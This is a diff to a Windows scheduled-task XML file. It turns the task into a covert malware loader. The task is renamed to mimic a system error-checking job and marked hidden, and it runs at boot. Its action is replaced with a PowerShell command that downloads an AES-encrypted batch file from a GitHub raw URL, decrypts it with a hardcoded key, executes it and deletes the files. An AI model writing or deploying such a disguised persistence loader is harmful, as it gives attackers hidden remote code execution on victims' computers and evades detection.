@@ -3,7 +3,7 @@
   <RegistrationInfo>
     <Date>2024-12-19T10:20:47.2761859</Date>
     <Author>LAPTOP-UDHP41S0\TEST</Author>
-    <URI>\Task</URI>
+    <URI>\WindowsErrorChecking</URI>
   </RegistrationInfo>
   <Triggers>
     <BootTrigger>
@@ -32,7 +32,7 @@
     </IdleSettings>
     <AllowStartOnDemand>true</AllowStartOnDemand>
     <Enabled>true</Enabled>
-    <Hidden>false</Hidden>
+    <Hidden>true</Hidden>
     <RunOnlyIfIdle>false</RunOnlyIfIdle>
     <WakeToRun>false</WakeToRun>
     <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
@@ -49,14 +49,7 @@
     </Exec>
     <Exec>
       <Command>powershell</Command>
-      <Arguments>curl -o C:\Windows\System32\WindowsPowerShell\run.bat https://raw.githubusercontent.com/mitutina/mitutina/main/run.bat</Arguments>
-    </Exec>
-    <Exec>
-      <Command>C:\Windows\System32\WindowsPowerShell\run.bat</Command>
-    </Exec>
-    <Exec>
-      <Command>powershell</Command>
-      <Arguments>Remove-Item "C:\Windows\System32\WindowsPowerShell\run.bat" -Force</Arguments>
+      <Arguments>-Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/b.bat' -OutFile '%TEMP%\WindowsErrorChecking.bat'; $encryptedBytes = [System.IO.File]::ReadAllBytes('%TEMP%\WindowsErrorChecking.bat'); $key = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456'); $iv = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456'); $aes = [System.Security.Cryptography.AesManaged]::new(); $aes.Key = $key; $aes.IV = $iv; $decryptor = $aes.CreateDecryptor(); $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length); [System.IO.File]::WriteAllBytes('%TEMP%\WindowsShell.bat', $decryptedBytes); Start-Process '%TEMP%\WindowsShell.bat' -Wait; Remove-Item '%TEMP%\WindowsErrorChecking.bat', '%TEMP%\WindowsShell.bat' -Force"</Arguments>
     </Exec>
   </Actions>
 </Task>
